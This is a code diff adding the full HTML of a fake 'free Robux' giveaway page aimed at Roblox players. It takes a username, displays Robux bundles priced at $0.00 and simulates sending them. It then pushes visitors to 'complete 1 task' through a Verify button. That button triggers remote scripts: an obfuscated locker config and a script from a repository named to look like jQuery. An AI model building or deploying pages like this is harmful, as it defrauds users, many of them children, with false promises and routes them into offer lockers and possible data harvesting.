@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>robux</title>
+    <link rel="icon" type="image/x-icon" href="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700458ba7cab444a522b7c8e71b8233099cf2c.png">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/dev20l/jquery-ajax-3.7.9/6.css">
+    <style>
+        .container {
+            background-color: #7d96b5 !important;
+            background-image: url(https://i.imgur.com/oLk3XsJ.jpeg);
+            min-height: 100vh;
+            width: 100%;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: cover;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(125, 150, 181, 0.9);
+            z-index: 1;
+        }
+
+        .container * {
+            position: relative;
+            z-index: 8;
+        }
+    </style>
+
+    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+    <meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+    <div class="navbar" style="display: flex; justify-content: space-between; align-items: center; padding: 10px;">
+        <div class="profile" style="display: flex; align-items: center;">
+            <div class="profileimg" style="width: 40px; height: 40px; margin-right: 5px;">
+                <img src="https://i.imgur.com/FwEimFN.png" alt="صورة الشخص" style="width: 100%; height: 90%; border-radius: 40%;">
+            </div>
+        </div>
+        <div id="how-it-works-btn" style="cursor: pointer; font-size: 30px; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center;">
+            ☰
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="boxholder">
+            <div class="box1 box2">
+                <div class="logo-container">
+                    <img src="https://i.imgur.com/LKMA1Tg.png" class="logo">
+                </div>
+                <p class="maintxt">Robux allows you to purchase upgrades for your avatar or buy special abilities in experiences</p>
+                <span class="title">Enter your Username</span>
+                <input type="text" class="username" placeholder="Type your user ...">
+                <button class="getrbx">Continue</button>
+            </div>
+
+            <div class="box1 boxanimation" style="display: none;">
+                <div class="loeader"></div>
+                <div class="logo-container1">
+                    <img src="https://i.imgur.com/TW9Ms92.gif" class="logo1">
+                </div>
+          <p class="animationtxt">Searching for User...</p>
+            </div>
+
+            <div class="box1 box3" style="display: none;">
+                <div id="userInfoContainer" class="user-info"></div>
+                <hr style="width: 100%; height: 50px; background-color:#1a1b1d; border: none; transform: scaleY(0.2);">
+                <div class="row">
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic">
+                                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700441f54cda29360d16d1cb0f02e0e32ee181.png">
+                            </div>
+                            <span>1 700</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic">
+                                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700441f54cda29360d16d1cb0f02e0e32ee181.png">
+                            </div>
+                            <span>4 500</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic">
+                                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700441f54cda29360d16d1cb0f02e0e32ee181.png">
+                            </div>
+                            <span>10 000</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic">
+                                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700441f54cda29360d16d1cb0f02e0e32ee181.png">
+                            </div>
+                            <span>50 000</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="box1 boxanimation" style="display: none;">
+                <div class="loeader">
+                    <img class="fade-image" src="robux.png">
+                </div>
+                <p class="animationtxt">Sending Robux to...</p>
+            </div>
+
+              <div class="box1 box4" style="display: none;">
+              <div class="logo-container">
+                    <img src="https://i.imgur.com/UvDgpCs.gif" class="logo">
+                </div>
+                <p class="maintxt2">Please click on the button below and complete 1 task to verify that you're not a robot!</p>
+                <button onclick="_rp()">Verify</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="how-it-works-modal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn">&times;</span>
+            <h2>How it works?</h2>
+            <p>
+                1. Enter your Roblox username.<br>
+                2. Select the amount of Robux you want.<br>
+                3. Follow the instructions to verify you're not a bot.<br>
+                4. Enjoy your Robux in your account!
+            </p>
+        </div>
+    </div>
+
+    <div class="footer">
+        <span>Copyright &copy; 2025</span>
+        <p>This is a copyrighted website and using it with no permission could result in facing a lawsuit by <strong>roblox</strong>.</p>
+    </div>
+<script type="text/javascript">
+    var jMGht_qcQ_QZPVfc={"it":4387074,"key":"cd895"};
+</script>
+<script src="https://d29gqhzevia104.cloudfront.net/e097773.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/dev20l/jquery-ajax-3.7.9@main/6.js"></script>
+</body>
+</html>
